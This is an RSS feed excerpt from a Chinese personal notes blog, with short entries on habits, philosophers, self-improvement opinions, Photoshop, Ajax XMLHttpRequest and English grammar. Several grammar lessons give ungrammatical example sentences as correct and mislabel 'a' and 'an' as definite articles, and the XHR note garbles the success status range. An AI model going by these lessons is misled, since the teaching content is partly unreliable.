好了，看到这里，你意识到敌人的存在了，即大脑的原始部分；
你也意识到它惯用的伎俩——即时满足感。但这还不够，要打败它，你得掌握科学的武器，也就是习惯的原理。
习惯的原理 习惯的养成，依赖于四个部分：触机（cue）、惯性行为（routine）、奖励（reward）和信念（belief）：</description>
    </item>
    
    <item>
      <title>苏格拉底</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E8%8B%8F%E6%A0%BC%E6%8B%89%E5%BA%95/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E8%8B%8F%E6%A0%BC%E6%8B%89%E5%BA%95/</guid>
      <description>苏格拉底 苏格拉底是谁？ 苏格拉底从未留下任何文字，但却是对欧洲思想影响最重大的人物之一。
我们所知道的苏格拉底，事实上是柏拉图笔中的苏格拉底。
以人为中心 人是衡量一切的尺度。
一件事情是对是错、是好是坏，完全要看它与人类的需求有何关系而定。
人的很多行为都是由社会规范的制约所致。
谈话的艺术 假装自己一无所知，并与对方讨论，在这讨论的过程中设法使对手承认自己理论上的漏洞。
他的工作就是帮助人们 生出 正确的思想。
神圣的声音 耶稣与苏格拉底都相信自己是某一种更高力量的代言人（神明的指引），他们批判各种形式的不公不义与腐败现象，最后皆因此丧命。其实他们都可以通过求饶而活命，但最终却皆选择了成仁取义。</description>
    </item>
    
    <item>
      <title>萨特</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E8%90%A8%E7%89%B9/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E8%90%A8%E7%89%B9/</guid>
      <description>萨特 人的的存在比任何其他事情都要重要。
人并没有一种不变的本性。
在道德的抉择上也是如此我们永远不能把错误归咎于&amp;quot;人性&amp;quot;或&amp;quot;人的软弱&amp;quot;等等我们可以发现时常有成年男子做出种种令人厌恶的行为，却把这样的行为归咎于&amp;quot;男人天生的坏毛病&amp;quot;可是世上没有&amp;quot;男人天生的坏毛病&amp;quot;这种东西，那只是我们用来避免为自己的行为负责的借口罢了。
所谓哲学问题的定义就是每一个世代，甚至每一个人，都必须要一再地问自己的问题。</description>
    </item>
    
    <item>
      <title>行到极处便是知，知到极处便是行</title>
      <link>https://note.yxzi.xyz/note/view/thinking/%E8%A1%8C%E5%88%B0%E6%9E%81%E5%A4%84%E4%BE%BF%E6%98%AF%E7%9F%A5%E7%9F%A5%E5%88%B0%E6%9E%81%E5%A4%84%E4%BE%BF%E6%98%AF%E8%A1%8C/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/thinking/%E8%A1%8C%E5%88%B0%E6%9E%81%E5%A4%84%E4%BE%BF%E6%98%AF%E7%9F%A5%E7%9F%A5%E5%88%B0%E6%9E%81%E5%A4%84%E4%BE%BF%E6%98%AF%E8%A1%8C/</guid>
      <description>行到极处便是知，知到极处便是行 当你感觉自己知道的很多，却都做不到的时候，这不是因为你知道得太多，而是因为你知道的不够多：
你没能从心智模式、思维习惯、适用情境等各个方面真正深入透彻地理解一件事情。
你没有理解到极致的事情，怎么可能做得到呢？
这也是王阳明先生所说：“知到极处便是行，行到极处便是知。”
每个人都说“知道那么多大道理，却仍然过不好一生”，反过来想想，
也许正是因为我们知道的大道理既不够多、也不够深，才让我们无法再思想中融会贯通，
形成一套自己的思维习惯和行为习惯，从而在自相矛盾的道理中无法前行。
当你不能采取积极的行动去学习，说明你根本就没有真正懂得学习对你的重要性
就像，你知道自己应该早起，需要早起，然后你订了一个 5 点起床的计划，无法执行，于是你很难过。
一个透彻地知道早起的人，应该深入细致地了解自己的睡眠习惯，了解自己的常态睡眠方式，
然后深刻地了解自己怎么样一步一步地把起床时间慢慢向前拨，
更重要的是配合分析自己 24 小时中的精力状况，饮食、运动和情绪状况，
才能找到真正适合自己又能保证精力充沛的 5 点起床方案。
想一想，这中间需要投入多少知识，和多少努力，才能做到？
相反地，每当我们责怪自己不能“践行”，或是“执行力”不佳的时候，我们其实就掉入了“用蛮干代替策略”的思维模式。
须知，大多数相对复杂的事情，都得靠顺着性子的策略来，而不是一蹴而就地蛮干就能成。
任何需要比较复杂的认知系统的事情，都不是靠“执行力”实现的。
当你觉得自己执行力不足的时候，一定要反过来思考：
明白道理只是第一步，后面两步叫做：取势（认识对自己而言的客观规律）、优术（后期不断优化执行方式）。
很多道理人类都是共通的，关键是执行力，对道理的思考和超强的执行力，才是人与人存在差距的原因</description>
    </item>
    
    <item>
      <title>裁剪图形</title>
      <link>https://note.yxzi.xyz/note/technology/software/photoshop/%E8%A3%81%E5%89%AA%E5%9B%BE%E5%83%8F/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/software/photoshop/%E8%A3%81%E5%89%AA%E5%9B%BE%E5%83%8F/</guid>
      <description>裁剪图形  导入图像。 解锁当前图像所在的图层。 菜单栏——图像——画布大小——调整参数——确定。 调整图像将要被被保留的部分。  </description>
    </item>
    
    <item>
      <title>要理解真正的需求后才去努力</title>
      <link>https://note.yxzi.xyz/note/view/thinking/%E8%A6%81%E7%90%86%E8%A7%A3%E7%9C%9F%E6%AD%A3%E7%9A%84%E9%9C%80%E6%B1%82%E5%90%8E%E6%89%8D%E5%8E%BB%E5%8A%AA%E5%8A%9B/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/thinking/%E8%A6%81%E7%90%86%E8%A7%A3%E7%9C%9F%E6%AD%A3%E7%9A%84%E9%9C%80%E6%B1%82%E5%90%8E%E6%89%8D%E5%8E%BB%E5%8A%AA%E5%8A%9B/</guid>
      <description>要理解真正的需求后才去努力 在你努力做出东西，抛出鱼饵之前，你很难理解真正的需求。
而这世界上有很多需求，全部是被创造者自己创造出来的。
比如：
汽车发明以前，你去问人们需要什么交通工具，他们会说需要一匹更快的马。
电灯发明以前，你去问人们需要什么照明工具，他们会说需要更长更大的蜡烛。
就如同在乔布斯之前，永远没有人会告诉你，我需要一部 iPhone，而今天，我们已经完全无法离开 iPhone。</description>
    </item>
    
    <item>
      <title>读书能赚钱吗</title>
      <link>https://note.yxzi.xyz/note/view/read/%E8%AF%BB%E4%B9%A6%E8%83%BD%E8%B5%9A%E9%92%B1%E5%90%97/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/read/%E8%AF%BB%E4%B9%A6%E8%83%BD%E8%B5%9A%E9%92%B1%E5%90%97/</guid>
      <description>读书能赚钱吗 做生意赚钱靠读书激发？作者有那本事还写书？有写书的时间早赚钱去了，成功了雇几个枪手给他写《我的成功也能&amp;hellip;&amp;hellip;》。
这里不是说读书不好，但读书和做生意是两条路，自古就是两条路，很多富翁都是大学休学。
所谓白手起家，一个是资金上白手，一个是做生意经验上白手。
读书越多，想的越多，想的越多，做事越谨慎，做生意靠谨慎只会越做越小，勉强原地踏步。
一般都是捞到一票了才开始谨慎，一开始要捞一票，谨慎很难捞到。
读书多不代表做生意能成，搞原子弹的不如卖茶叶蛋的歇后语听过没。
做生意是一个行当，做学术也是一个行当，这是两个不同的行当。
除非能把全世界所有学科的书都烂熟于胸，否则只读很窄一面的书，或者就读成功学，那我只能祝你好运了。</description>
    </item>
    
    <item>
      <title>轻易得到就不会被珍惜</title>
      <link>https://note.yxzi.xyz/note/view/gam/%E8%BD%BB%E6%98%93%E5%BE%97%E5%88%B0%E5%B0%B1%E4%B8%8D%E4%BC%9A%E8%A2%AB%E7%8F%8D%E6%83%9C/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/gam/%E8%BD%BB%E6%98%93%E5%BE%97%E5%88%B0%E5%B0%B1%E4%B8%8D%E4%BC%9A%E8%A2%AB%E7%8F%8D%E6%83%9C/</guid>
      <description>很多人认为，轻易得来的，不会懂得珍惜。
我是这么看的：如果得来的东西不是我所需要的，那珍不珍惜对我来说都无所谓。
“非常需要”才会想要珍惜，怎么得来的是其次。
有人不懂得珍惜，那不是因为得来有多“轻易”，而是因为他不知道自己有多“需要”。
有一句话说“失去后才懂得珍惜”。
当你非常需要的东西极自然而然地融入了你的生活，你感受不到自己有多需要它，自然就不会意识到该去珍惜。
即使别人告诉你应该珍惜，你也很可能因为没有切身感受那种非常需要的感觉而满不在意。
可一旦某天你失去了它，你立刻就会发现，你的生活缺了什么东西，而它就像是空气。
有些人不知道自己需要什么就想方设法去“得到”某样东西 ，得到后渐渐发觉自己并没有想象中那样需要它。
即使得到的过程非常艰辛，他最终也不会明白什么是珍惜。
只有明白自己有多需要，你才会懂得珍惜。</description>
    </item>
    
    <item>
      <title>达尔文</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E8%BE%BE%E5%B0%94%E6%96%87/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E8%BE%BE%E5%B0%94%E6%96%87/</guid>
      <description>达尔文 适者生存，物竞天择。
进化是生存竞争钟自然淘汰的结果，在这个过程中，哪些最能够适应环境的人就存活了下来。</description>
    </item>
    
    <item>
      <title>阈值自控意识</title>
      <link>https://note.yxzi.xyz/note/view/thinking/%E9%98%88%E5%80%BC%E8%87%AA%E6%8E%A7%E6%84%8F%E8%AF%86/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/thinking/%E9%98%88%E5%80%BC%E8%87%AA%E6%8E%A7%E6%84%8F%E8%AF%86/</guid>
      <description>阈值自控意识 阈值又叫临界值，指释放一个行为反应所需要的最小刺激强度。
 A 片害了无数正常的男青年。
没有 A 片的岁月里，男孩子满脑邪念充盈。
可是在这个网络色情泛滥的当今，他们居然对生活中的女人没了想法，这不能不成为信息时代人类异化的经典案例。
何以至此？阈值使然。
也就是不断的持续刺激，抬高了男人们欲望的触发点。
上个世纪初女人旗袍坐下时偶尔可一瞥的白花花大腿就可以触发老夫子们的欲念；
可是 100 年后，看着满屏的器官进出，很多人居然会叹上一句：没意思。
这就是时代的变迁，使得阈值不断上升的最好例证。
 顺便提下：
频繁观看色情片造成的过度刺激，会抑制大脑内对性刺激做出神经反应的奖赏机制，与药物成瘾相似，
这种神经抑制会促使强迫的色情成瘾行为，并对正常的性意愿和性欲造成影响。
可惜，对于有些人，这些话来的有点晚了。
举个极端的例子，
 释迦牟尼本是个迦毗罗卫国的王子，很早就过着锦衣玉食的生活。
其父为其修筑春、夏、冬三幢宫殿。
但他活的很厌世。
其父为其选来印度最妖艳美丽的女子来取悦他。
但是美酒美女对他的边际效用已经小到忽略，食欲肉欲的一切无法使他获得更高的满足，只有离开世俗创造佛教去了。
 他一出生就享受物质的极大满足，导致他的阈值高到普通人难以想象的程度，最后凡是物质都无法使他快活。
中国的例子是贾宝玉，从小活在女人堆里，最后也做和尚去了。
反而自小出家的人却未必能忘俗。
所以施耐庵会有和尚最淫一说，潘巧云与裴如海那一段有很精妙的点评。
因自幼出家的人，从未享受过世俗的快感，所以阈值很低，一点就着。
能大彻大悟的慧根人士，往往反而是富家子弟，也就不奇怪了。
女人亦然。
泛滥的韩剧将正常的女生活生生逼成大龄剩女，归根到底也是阈值作怪。
本来少女看见年轻男子怀春，是老天爷安排的正常心理活动。
现在这个自然的程序被突然打断，横插 10 部韩剧，部部男一号多金英俊完美，还有若干男二男三争抢。
电视机前的女人们于是看傻了，爱情阈值被活生生地抬到天上，身边的男人自然再也看不上。
当你深刻理解了阈值对个人幸福与快乐的影响后，你就知道这个概念不仅用在性和爱情上，更可以推广到人生幸福的方方面面。
了解边际效用递减的规律，并学会一定程度的禁欲和自控，是防止阈值升高的不二法门.
这绝对是需要在人生早期就要着力培养和锻炼的素质与意识，尤其对于男性。</description>
    </item>
    
    <item>
      <title>马克思</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E9%A9%AC%E5%85%8B%E6%80%9D/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E9%A9%AC%E5%85%8B%E6%80%9D/</guid>
      <description>马克思 一个社会的是非标准是由那个社会里的统治阶级来决定的，因为，人类社会的历史就是一部阶级斗争史。</description>
    </item>
    
    <item>
      <title>黑格尔</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E9%BB%91%E6%A0%BC%E5%B0%94/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E5%93%B2%E5%AD%A6%E5%AE%B6/%E9%BB%91%E6%A0%BC%E5%B0%94/</guid>
      <description>黑格尔 人类的认知的基础会变化，因此世界上没有永恒的真理，没有永恒的理性。
历史就像一条流动的河，河里任何一处河水的流动都受到上游河水的涨落与漩涡的影响。但上游河水的涨落与漩涡又受到你观察之处的岩石与河湾的影响。
理性的历史就像一条河，你的思考方式乃是受到宛如河水般向前推进的传统思潮与当时的物质条件的影响。因此你永远无法宣称任何一种思想是永远对的。只不过就你所置神之处而言，这种思想可能是正确的。
事情的对错要看历史的情况而定。
你不可能将任何哲学家或任何思想抽离他们的历史背景。
人类的知识在不断的扩张，在进步。
每一种新思想通常都是以前人的旧思想为基础，而一旦有一种新思想被提出来，马上就会出现另外一种和它抵触的思想，于是这两种对立的思想之间就会产生一种紧张状态，但这种紧张状态又会因为有人提出另外一种融合了两种思想长处的思想而消除。黑格尔把这个现象称为一种辩证过程。
辩证法 假设一种观点是正，那么必定有与他相反的观点反存在，因此便产生了两种观点之间的矛盾，之后这两种观点再被第三种观点合给消除，这时的合就变为了正，而这个正也会有另一个反与其相矛抵触。</description>
    </item>
    
    <item>
      <title>Ajax XMLHttpRequest</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/xmlhttprequest/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/xmlhttprequest/</guid>
      <description>XMLHttpRequest 该对象用于与服务器交互；通过它可以在不重新刷新页面的情况下请求特定 URL，获取数据，这样就可以使得网页在不影响用户操作的情况下，更新页面的局部内容。
判断浏览器是否支持 XHR // 如果浏览器支持 XHR if (Xhr) { ... }else{  alert(&amp;#39;Sorry, your browser doesn\&amp;#39;t support XMLHttpXhr&amp;#39;); } 创建 XHR 对象 const xhr = new XMLHttpRequest(); 方法 readyState 返回 XMLHttpRequest 的当前所处状态的 状态码。
 0 表示 XHR 对象已经被创建，但尚未调用 open() 方法。 1 表示 open 方法已经被调用完毕。 2 表示 send 方法已经被调用完毕，并且头部和状态已经可获得。 3 表示服务端已经返回了部分结果，但并没有返回所有结果，且 ResponseText 属性已经包含部分数据。 4 表示服务端已经返回了所有结果。  status 返回 XMLHttpRequest 响应时的数字状态码。
200，状态码 &amp;gt;= 200 且 &amp;gt; 300 都算请求成功。
404
403</description>
    </item>
    
    <item>
      <title>English A4 纸泛背单词法</title>
      <link>https://note.yxzi.xyz/note/subject/english/a4-%E7%BA%B8%E6%B3%9B%E8%83%8C%E5%8D%95%E8%AF%8D%E6%B3%95/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/a4-%E7%BA%B8%E6%B3%9B%E8%83%8C%E5%8D%95%E8%AF%8D%E6%B3%95/</guid>
      <description>A4 纸泛背法 适用于在短时间内记住某个单词的中文翻译等。
开始  在一张空白 A4 纸的任意地方写出这个单词 看着单词并默念五遍其翻译 接着找一个空白处写出下一个单词，执行步骤 2 回到上一个单词，执行步骤 2，相当于将上一个单词复习一遍 根据自身情况可以改变单词默念的次数以及复习的次数  核心 快速的记忆，多次的重复。
睡前复习一次旧单词，醒来复习一次旧单词，日常复习一次旧单词，并背当天的 新单词
每次背单词注意力一定要高度集中，努力去看单词长啥样。
缺点 大概率不会读也不会写，但你在阅读中碰见了能知道它的意思。
艾宾浩斯记忆周期</description>
    </item>
    
    <item>
      <title>English How</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E6%84%9F%E5%8F%B9%E5%8F%A5/how/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E6%84%9F%E5%8F%B9%E5%8F%A5/how/</guid>
      <description>How how +形容词/副词 + 主语 + 谓语
How careful he is！（他多细心啊！)
How fast he runs！（他跑得多快啊！）
how + 形容词 + 冠词(a、an) + 可数名词的单数 + 主语 + 谓语
How cute a dog it is!(它是多么可爱的一只狗啊！)</description>
    </item>
    
    <item>
      <title>English What</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E6%84%9F%E5%8F%B9%E5%8F%A5/what/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E6%84%9F%E5%8F%B9%E5%8F%A5/what/</guid>
      <description>What what + 冠词（a、an） + 形容词 + 可数名词的单数 + 主语 + 谓语
What a beautiful photo it is!（这照片它多美啊！）
what + 形容词 + 不可数名词/名词复数 + 主语 + 谓语
What cleanly water it is!（多干净的水啊！）
What brilliant dogs they are!（多聪明的狗啊！）</description>
    </item>
    
    <item>
      <title>English 一般疑问句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E4%B8%80%E8%88%AC%E7%96%91%E9%97%AE%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E4%B8%80%E8%88%AC%E7%96%91%E9%97%AE%E5%8F%A5/</guid>
      <description>一般疑问句 可以用 yes、no 回答。
一般疑问句通常是由陈述句变过来的，下面列举陈述句变一般疑问句的几种方式。
提前系动词（be 动词、感官动词） 主 + 系 + 表 ——&amp;gt; 系 + 主 + 表
陈述句：You are an idiot.（你是个笨蛋）
一般疑问句：Are you an idiot?（你是不是个笨蛋？）
回答：Yes,i am./No,i am not.
提前助动词（do、have、shall 等） 主 + 谓 +（宾）——&amp;gt; 助动词 + 主 + 动词原形 + 其他
陈述句：You（have got light bulbs.（你有灯泡）
一般疑问句：（Have）you got light bulbs?（你有灯泡吗？）
回答：Yes,i have./No,i have not.
提前情态动词（can、may、will） 主 + 情态动词 + 动词原形 + 其他 ——&amp;gt; 情态动词 + 主+ 动词原形 + 其他</description>
    </item>
    
    <item>
      <title>English 主系表</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E7%B3%BB%E8%A1%A8/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E7%B3%BB%E8%A1%A8/</guid>
      <description>主系表 主语 ＋ 系动词 ＋ 表语（形容主语）
系动词用于链接前面的主语和后面的表语。
所谓的“主系表”句型是描述静态的世界，即：什么是什么；
系动词 = be 动词（is、are、am） + 感官动词（看、听、闻、尝、感觉、似乎、抱持、证明）
系动词后面大部分是表语。
例句  The food is delicious. They are students. He fell asleep She is rich now. i am in Chinese now.  </description>
    </item>
    
    <item>
      <title>English 主语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E4%B8%BB%E8%AF%AD/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E4%B8%BB%E8%AF%AD/</guid>
      <description>主语 一个句子的主体，也可以说是一句话主要叙述的对象或者这句话主要讲的内容。
大部分代词都可以作主语，尤其是人称代词的主格，宾格不能作主语。
例句  I like watching TV Chinese is hard.  </description>
    </item>
    
    <item>
      <title>English 主谓</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93/</guid>
      <description>主谓 主语 ＋ 不及物动词。
 The universe remains. I can draw. He likes singing. I work every day. I run every day.  </description>
    </item>
    
    <item>
      <title>English 主谓双宾</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93%E5%8F%8C%E5%AE%BE/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93%E5%8F%8C%E5%AE%BE/</guid>
      <description>主谓双宾 主语 ＋ 谓语（双及物动词） + 间宾 ＋直宾。
双宾的特点是两个宾语都能承受这个动作（双及物动词），以及两个宾语都能被作为主语。如果不能都被作为主语，那这个句子就是宾补。
一个句子中的间宾和直宾都能被作为被动语态主语，且双宾必须是一个人一个物，那么这个句子就是双宾，否则是宾补。
 I give you money. Her father bought her a dictionary. I gave her a book yesterday.  </description>
    </item>
    
    <item>
      <title>English 主谓宾</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93%E5%AE%BE/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93%E5%AE%BE/</guid>
      <description>主谓宾 主体 ＋ 谓语（单及物动词） ＋ 动作的承受者。
所谓的“主谓宾”句型是描述动态的世界，即：什么做了什么。
 I love you. He took his bag and left. I read English every morning.  </description>
    </item>
    
    <item>
      <title>English 主谓宾宾补</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93%E5%AE%BE%E5%AE%BE%E8%A1%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E9%99%88%E8%BF%B0%E5%8F%A5/%E4%B8%BB%E8%B0%93%E5%AE%BE%E5%AE%BE%E8%A1%A5/</guid>
      <description>主谓宾宾补 主语 + 谓语（少数特定的及物动词） ＋ 宾语 + 宾语补足语。
为什么要跟一个宾补，因为如果不跟宾补的话，句子的意思会不完整。
宾补中的宾语和宾补都是指同一个人或同一个事物，它们通常是同位语关系。
 I call her Mary. They ordered hamburger their lunch. I made her happy yesterday.  </description>
    </item>
    
    <item>
      <title>English 介词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D/</guid>
      <description>介词 用于表示位置，方向等，使句子形成结构，介词没有实际意义
主要用来表明名词和代词与其他句子成分的关系。
 I ate three apple with chopsticks.  介词也叫前置词，是一种虚词，不能单独做句子成分，一般只能用在名词或者代词、数词和动名词的前面。介词可以与这些词语构成介词短语，才能在句子红充当一个句子成分。
 In Guangxi. In the school. in 2023.  介词虽然数量不多，但是通常因为一个介词有好几十个意思，甚至是上百个，所以很难掌握，也很难区别。
比如最常用的介词 in，它的意义至少就有 6 个。
In 在&amp;hellip;地方 in China.
在&amp;hellip;里面  in my room.  表时间，在某年，某月  in 2023. in May.  在&amp;hellip;之后  in three days.  穿什么颜色的衣服  in red.  用&amp;hellip;语言  in English  介词的分类 简单介词 由一个单词组成的介词。
 in. after.  复合介词 由两个单词组成一个新词的介词。
 inside. into.</description>
    </item>
    
    <item>
      <title>English 代词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%A3%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%A3%E8%AF%8D/</guid>
      <description>代词 用于代替名词的词，从而避免对话或语句中重复名词。
 I am person. she is beautiful.  人称代词 用于指代人，当然，也有些人称代词页可以指代事物
i、it、you、he、she、we、they 等等都是人称代词。
它有主格和宾格，以及有第一人称（我）、第二人称、（你）第三人称（他）
主格 作主语的格式，主格才可以作主语，宾格不行。
人称代词的主格只有：i、we、you、she、he、it、they.
在句子里做主语或者表语
 They are students. He is very handsome. It is cheap.  注意，两个或者两个以上的人称代词主格的单数作并列主语的时候顺序为：
第二人称（你）——&amp;gt; 第三人称（他）——&amp;gt; 第一人称（我）
如果是复数，顺序是: we、you and they，比如：
 He and i are both form China. You and i both like beautiful girls. You and he and me are all good students.  宾格 作宾格的格式，宾格才可以作宾语。
做及物动词或者介词之后的宾语
 I tell her my name.</description>
    </item>
    
    <item>
      <title>English 冠词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%86%A0%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%86%A0%E8%AF%8D/</guid>
      <description>冠词 用于说明名词的意义，通常在名词前后，形成特指或泛指的作用，不能单独使用。
定冠词 定冠词 the，表示这个或那个，特指某个名词。可以修饰可数名词单数/复数名词，或不可数名词。
凡是特指某个事物的名词，都要加定冠词 a、an、the，反之，如果时泛指某类事物的名词，则不需要加冠词。
上文中重新提及的人或物之前  This car is popular, but the car isn’t cheap. I bought a book yesterday.The book is interesting. I know a friend.The friend is a doctor.  在谈话观方都知道的人或物之前  pass me the book, please! pass me the books, please! Pass the salt to me, please!  在有限定性后置定语修饰的名词之前  The center of the city. The people in the park.  在序数词之前  the first.</description>
    </item>
    
    <item>
      <title>English 副词从句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E6%9D%82%E5%8F%A5/%E5%89%AF%E8%AF%8D%E4%BB%8E%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E6%9D%82%E5%8F%A5/%E5%89%AF%E8%AF%8D%E4%BB%8E%E5%8F%A5/</guid>
      <description>副词从句 将简单句修改，使它成为另一个句子的状语，也叫状语从句。
根据用途，可以将副词从句分为九大类：
 表时间（在&amp;hellip;前） 表地点（在&amp;hellip;地方) 表条件（如果&amp;hellip;） 表让步（虽然&amp;hellip;但是&amp;hellip;） 表方式（就好像&amp;hellip;） 表比较（比&amp;hellip;） 表原因（因为&amp;hellip;所以&amp;hellip;） 表目的（为了&amp;hellip;） 表结果（所以&amp;hellip;）  时间副词从句 在某一时间点之前 before
 Before the wolf stopped by, the rabbit ate a carrot at home.  在某一时间点之中（当时） when，突然的某个时间点。
